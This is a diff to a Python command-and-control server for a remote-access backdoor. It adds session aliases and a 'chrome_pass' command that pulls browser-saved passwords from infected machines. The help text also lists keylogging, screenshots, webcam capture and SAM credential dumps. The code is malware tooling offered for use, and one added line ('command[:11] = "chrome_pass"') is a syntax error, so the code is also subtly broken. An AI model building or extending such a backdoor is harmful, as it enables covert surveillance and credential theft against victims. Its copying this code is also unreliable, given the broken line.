@@ -136,19 +136,19 @@ def calculate_sha256_checksum(file_name):
     return sha256_hash.hexdigest()
 
 
-def calculate_md5_checksum(file_name):
-    """
-    Calculate the MD5 checksum of a file.
-    Args:
-        file_name (str): The name of the file to check.
-    Returns:
-        str: The MD5 checksum of the file.
-    """
-    md5_hash = hashlib.md5()
-    with open(file_name,"rb") as f:
-        for byte_block in iter(lambda: f.read(4096),b""):
-            md5_hash.update(byte_block)
-    return md5_hash.hexdigest()
+# def calculate_md5_checksum(file_name):
+#     """
+#     Calculate the MD5 checksum of a file.
+#     Args:
+#         file_name (str): The name of the file to check.
+#     Returns:
+#         str: The MD5 checksum of the file.
+#     """
+#     md5_hash = hashlib.md5()
+#     with open(file_name,"rb") as f:
+#         for byte_block in iter(lambda: f.read(4096),b""):
+#             md5_hash.update(byte_block)
+#     return md5_hash.hexdigest()
 
 
 # TODO: Write a function for checksum validation on client-side.
@@ -233,9 +233,6 @@ def webcam(target, count):
 
     return count + 1
 
-# TODO: webcam(target) takes a quick webcam image
-# https://stackoverflow.com/a/69282582/4443012
-
 # TODO: encrypt()
 # TODO: decrypt() functions using RSA library AES128-GCM
 
@@ -255,6 +252,7 @@ def server_help_manual():
     keylog_dump                         --> Print Keystrokes That The Target From taskmanager.txt
     keylog_stop                         --> Stop And Self Destruct Keylogger File
     screenshot                          --> Takes screenshot and sends to server ./images/screenshots/
+    chrome_pass                         --> Retrieves browser saved Passwords
     webcam                              --> Takes image with webcam and sends to ./images/webcam/
     start *programName*                 --> Spawn Program Using backdoor e.g. 'start notepad'
     remove_backdoor                     --> Removes backdoor from target!!!
@@ -294,6 +292,7 @@ def accept_connections():
             target, ip = sock.accept()
             targets.append(target)
             ips.append(ip)
+            alias.append(" ")
             # print(termcolor.colored(str(ip) + ' has connected!', 'green'))
             print(Colour().green(str(ip) + ' has connected!') +
                   '\n[**] Command & Control Center: ', end="")
@@ -374,10 +373,12 @@ def kill_target(targets, ips, command):
     target_index = int(command[5:])
     target = targets[target_index]
     ip = ips[target_index]
+    alis = alias[target_index]
     reliable_send(target, 'quit')
     target.close()
     targets.remove(target)
     ips.remove(ip)
+    alias.remove(alis)
 
 
 def send_all(targets, command):
@@ -412,10 +413,26 @@ def handle_session_command(targets, ips, command):
         session_id = int(command[8:])
         target = targets[session_id]
         ip = ips[session_id]
-        target_communication(target, ip)
+        alis = alias[session_id]
+        target_communication(target, ip,alis)
     except Exception as e:
         print('[-] No Session Under That ID Number. Error: ', e)
 
+def set_alias(targets, ips, alias, command):
+    """
+    Sets an alias for a target.
+    Args:
+        targets (list): The list of targets.
+        ips (list): The list of IPs.
+        alias (list): The list of aliases.
+        command (str): The command to handle.
+    """
+    session_id = int(command[5:])
+    if session_id>=len(targets):
+        print('[-] No Session Under That ID Number.')
+        return
+    alias[session_id] = input('Enter new alias for session '+ str(session_id) + ':')
+    print(alias)
 
 def handle_sam_dump(target, command):
     reliable_send(target, command)
@@ -454,7 +471,7 @@ def list_targets(ips):
         ips (list): The list of IPs.
     """
     for counter, ip in enumerate(ips):
-        print('Session ' + str(counter) + ' --- ' + str(ip))
+        print('Session ' + str(counter) + ' --- ' + str(ip) + ' --- ' + str(alias[counter]))
 
 
 def clear_c2_console():
@@ -539,7 +556,7 @@ def exit_c2_server(sock, t1):
     print(Colour().yellow('\n[-] C2 Socket Closed! Bye!!'))
 
 
-def target_communication(target, ip):
+def target_communication(target, ip, alis):
     screenshot_count = 0
     webcam_count = 0
 
@@ -566,6 +583,9 @@ def target_communication(target, ip):
             webcam_count += 1
         elif command[:12] == 'get_sam_dump':
             handle_sam_dump(target, command)
+        elif command[:11] = "chrome_pass":
+            result = reliable_recv(target)
+            print(result)
         elif command == 'help':
             server_help_manual()
         else:
@@ -593,6 +613,8 @@ def run_c2_server(targets, ips, sock, t1, start_flag):
                 clear_c2_console()
             elif command[:7] == 'session':
                 handle_session_command(targets, ips, command)
+            elif command[:5] == 'alias':
+                set_alias(targets, ips, alias, command)
             elif command == 'exit':
                 close_all_target_connections(targets)
                 start_flag = exit_c2_server(sock, t1)
@@ -617,6 +639,7 @@ def run_c2_server(targets, ips, sock, t1, start_flag):
 if __name__ == '__main__':
     targets = []
     ips = []
+    alias = []
     start_flag = True
 
     sock = initialise_socket()
